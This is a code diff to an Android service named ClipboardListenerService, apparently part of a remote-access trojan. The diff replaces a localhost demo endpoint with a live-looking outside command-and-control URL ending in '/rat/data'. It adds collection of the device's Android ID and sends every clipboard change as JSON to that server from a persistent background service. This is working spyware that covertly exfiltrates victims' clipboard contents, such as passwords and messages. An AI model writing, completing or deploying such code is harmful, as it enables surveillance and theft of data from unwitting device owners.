@@ -5,16 +5,20 @@ import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
+import android.provider.Settings;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.io.IOException;
 
 import okhttp3.Call;
 import okhttp3.Callback;
-import okhttp3.FormBody;
+import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.RequestBody;
@@ -23,12 +27,11 @@ import okhttp3.Response;
 public class ClipboardListenerService extends Service {
 
     private static final String TAG = "ClipboardListener";
-    // URL C2 perlu diganti dengan server asli.
-    // Untuk tujuan demonstrasi, ini akan mengarah ke endpoint yang tidak ada.
-    private static final String C2_URL = "http://127.0.0.1:8080/clipboard";
+    private static final String C2_URL = "https://bott-production-2188.up.railway.app/rat/data";
 
     private ClipboardManager clipboardManager;
     private OkHttpClient httpClient;
+    private String deviceId;
 
     private final ClipboardManager.OnPrimaryClipChangedListener clipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
         @Override
@@ -50,14 +53,20 @@ public class ClipboardListenerService extends Service {
         super.onCreate();
         clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         httpClient = new OkHttpClient();
-        Log.d(TAG, "ClipboardListenerService created.");
+        // Get unique device ID
+        try {
+            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to get device ID.", e);
+            deviceId = "unknown_device";
+        }
+        Log.d(TAG, "ClipboardListenerService created for device ID: " + deviceId);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "ClipboardListenerService started.");
         clipboardManager.addPrimaryClipChangedListener(clipChangedListener);
-        // Layanan ini perlu terus berjalan
         return START_STICKY;
     }
 
@@ -76,16 +85,25 @@ public class ClipboardListenerService extends Service {
         return null;
     }
 
-    private void sendClipboardData(String data) {
-        // Di sini Anda akan menambahkan ID perangkat atau informasi identifikasi lainnya
-        RequestBody formBody = new FormBody.Builder()
-                .add("clipboard_data", data)
-                .add("deviceId", "some_unique_id") // Contoh ID perangkat
-                .build();
+    private void sendClipboardData(String clipboardContent) {
+        JSONObject json = new JSONObject();
+        try {
+            JSONObject dataObject = new JSONObject();
+            dataObject.put("text", clipboardContent);
+
+            json.put("deviceId", deviceId);
+            json.put("dataType", "clipboard");
+            json.put("data", dataObject);
+        } catch (JSONException e) {
+            Log.e(TAG, "Failed to create JSON for clipboard data", e);
+            return;
+        }
+
+        RequestBody body = RequestBody.create(json.toString(), MediaType.get("application/json; charset=utf-8"));
 
         Request request = new Request.Builder()
                 .url(C2_URL)
-                .post(formBody)
+                .post(body)
                 .build();
 
         httpClient.newCall(request).enqueue(new Callback() {
@@ -99,9 +117,8 @@ public class ClipboardListenerService extends Service {
                 if (response.isSuccessful()) {
                     Log.i(TAG, "Successfully sent clipboard data to C2.");
                 } else {
-                    Log.e(TAG, "Failed to send clipboard data to C2. Response code: " + response.code());
+                    Log.e(TAG, "Failed to send clipboard data to C2. Response code: " + response.code() + " | Body: " + response.body().string());
                 }
-                // Pastikan untuk menutup body respons untuk melepaskan sumber daya
                 response.close();
             }
         });
